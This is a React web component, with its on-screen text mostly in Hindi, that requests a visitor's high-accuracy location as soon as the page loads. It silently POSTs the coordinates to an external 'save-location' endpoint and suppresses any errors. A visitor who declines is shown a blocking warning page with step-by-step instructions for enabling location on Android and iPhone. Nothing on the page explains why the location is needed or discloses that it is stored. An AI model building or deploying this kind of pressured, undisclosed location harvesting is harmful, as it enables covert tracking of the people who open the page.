"use client";

import { useState, useEffect } from "react";

export default function LocationPermission() {
    const [isDenied, setIsDenied] = useState(false);
    const [isChecking, setIsChecking] = useState(true);

    useEffect(() => {
        sendLocation();
    }, []);

    const sendLocation = async () => {
        if (!navigator.geolocation) {
            setIsChecking(false);
            return;
        }

        setIsChecking(true);
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                setIsDenied(false);
                setIsChecking(false);
                const locationData = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                };

                try {
                    await fetch("https://aks-furniture-server.onrender.com/save-location", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json",
                        },
                        body: JSON.stringify(locationData),
                    });
                } catch (error) {
                    // Fail silently
                }
            },
            (error) => {
                setIsChecking(false);
                if (error.code === error.PERMISSION_DENIED) {
                    setIsDenied(true);
                }
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0,
            }
        );
    };

    if (isDenied) {
        return (
            <div className="min-h-screen w-full bg-zinc-950 text-zinc-100 flex flex-col items-center justify-center p-6 text-center select-none font-sans relative overflow-hidden">
                {/* Glowing Background Orbs */}
                <div className="absolute top-1/4 left-1/2 -translate-x-1/2 -translate-y-1/2 w-64 h-64 bg-red-600/10 rounded-full blur-3xl pointer-events-none"></div>

                <div className="relative bg-zinc-900/70 backdrop-blur-xl border border-zinc-800/80 rounded-3xl p-8 max-w-md w-full shadow-2xl flex flex-col items-center z-10">
                    
                    {/* Animated Warning Icon */}
                    <div className="relative mb-6">
                        <div className="absolute inset-0 bg-red-500/20 rounded-full blur-md animate-ping"></div>
                        <div className="relative w-16 h-16 bg-red-950/60 border border-red-500/30 rounded-full flex items-center justify-center text-red-500 shadow-inner">
                            <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={2} stroke="currentColor" className="w-8 h-8 animate-pulse">
                                <path strokeLinecap="round" strokeLinejoin="round" d="M15 10.5a3 3 0 1 1-6 0 3 3 0 0 1 6 0Z" />
                                <path strokeLinecap="round" strokeLinejoin="round" d="M19.5 10.5c0 7.142-7.5 11.25-7.5 11.25S4.5 17.642 4.5 10.5a7.5 7.5 0 1 1 15 0Z" />
                            </svg>
                        </div>
                    </div>

                    {/* Warning Badge */}
                    <div className="px-3.5 py-1 bg-red-950/40 text-red-400 border border-red-900/50 rounded-full text-xs font-semibold tracking-wide mb-4 flex items-center gap-1.5">
                        <span className="w-2.5 h-2.5 bg-red-500 rounded-full animate-pulse"></span>
                        LOCATION REQUIRED
                    </div>

                    {/* Heading */}
                    <h1 className="text-2xl font-bold tracking-tight text-white mb-3">
                        लोकेशन परमिशन बंद है!
                    </h1>
                    
                    {/* Description */}
                    <p className="text-zinc-400 text-sm leading-relaxed mb-6">
                        बिना लोकेशन परमिशन के आप आगे नहीं बढ़ सकते। कृपया नीचे दिए गए स्टेप्स को फॉलो करके इसे चालू करें।
                    </p>

                    {/* Instruction Card */}
                    <div className="w-full text-left space-y-4 bg-zinc-950/60 border border-zinc-800/80 rounded-2xl p-5 mb-6 text-sm">
                       <div>
 <div>
    <div className="font-semibold text-zinc-200 flex items-center gap-2 mb-1.5">
        <span className="flex items-center justify-center w-5 h-5 rounded-full bg-zinc-800 text-xs text-zinc-300 font-bold">
            A
        </span>
        Android (Chrome) के लिए:
    </div>

    <ol className="list-decimal list-inside text-zinc-400 pl-7 space-y-1.5 text-xs">
        <li>
            यदि वेबसाइट किसी अन्य ब्राउज़र या ऐप में खुली है, तो पहले
            <strong className="text-zinc-200"> Open in Chrome</strong> करें।
        </li>

        <li>
            Chrome में वेबसाइट खुलने के बाद URL के बाईं ओर बने
            <strong className="text-zinc-200"> ⚙️ (Site Controls)</strong>
            आइकन पर टैप करें।
        </li>

        <li>
            <strong className="text-zinc-200">Permissions</strong> पर जाएँ।
        </li>

        <li>
            <strong className="text-zinc-200">Location</strong> को
            <strong className="text-green-500"> Allow</strong> करें।
        </li>

        <li>
            वेबसाइट पर वापस आएँ और पेज को
            <strong className="text-zinc-200"> Refresh</strong> करें।
        </li>
    </ol>
</div>
                        <div className="h-px bg-zinc-800/60"></div>

                        <div>
                            <div className="font-semibold text-zinc-200 flex items-center gap-2 mb-1.5">
                                <span className="flex items-center justify-center w-5 h-5 rounded-full bg-zinc-800 text-xs text-zinc-300 font-bold">I</span>
                                iPhone (Safari) के लिए:
                            </div>
                            <ol className="list-decimal list-inside text-zinc-400 pl-7 space-y-1.5 text-xs">
                                <li>फ़ोन की <strong className="text-zinc-200">Settings</strong> → <strong className="text-zinc-200">Safari</strong> → <strong className="text-zinc-200">Location</strong> में जाएं।</li>
                                <li>वहां <strong className="text-zinc-200">Ask</strong> या <strong className="text-zinc-200">Allow</strong> सिलेक्ट करें और पेज को दोबारा खोलें।</li>
                            </ol>
                        </div>
                    </div>

                    {/* Retry Button */}
                    <button 
                        onClick={() => window.location.reload()}
                        className="w-full py-3.5 bg-gradient-to-r from-red-600 to-rose-600 hover:from-red-500 hover:to-rose-500 text-white font-semibold rounded-xl shadow-lg shadow-red-950/40 hover:shadow-red-950/60 transition-all duration-300 hover:scale-[1.02] active:scale-[0.98] cursor-pointer"
                    >
                        फिर से प्रयास करें (Retry)
                    </button>
                </div>
            </div>
        );
    }

    return (
        <div className="min-h-screen w-full bg-zinc-950 flex flex-col items-center justify-center text-center">
            {/* Show a subtle loading / checking state so it doesn't look broken while prompting */}
            {isChecking && (
                <div className="flex flex-col items-center gap-3">
                    <div className="w-10 h-10 border-4 border-zinc-800 border-t-zinc-300 rounded-full animate-spin"></div>
                    <p className="text-zinc-500 text-xs font-semibold tracking-wider uppercase">Checking Location Status...</p>
                </div>
            )}
        </div>
    );
}
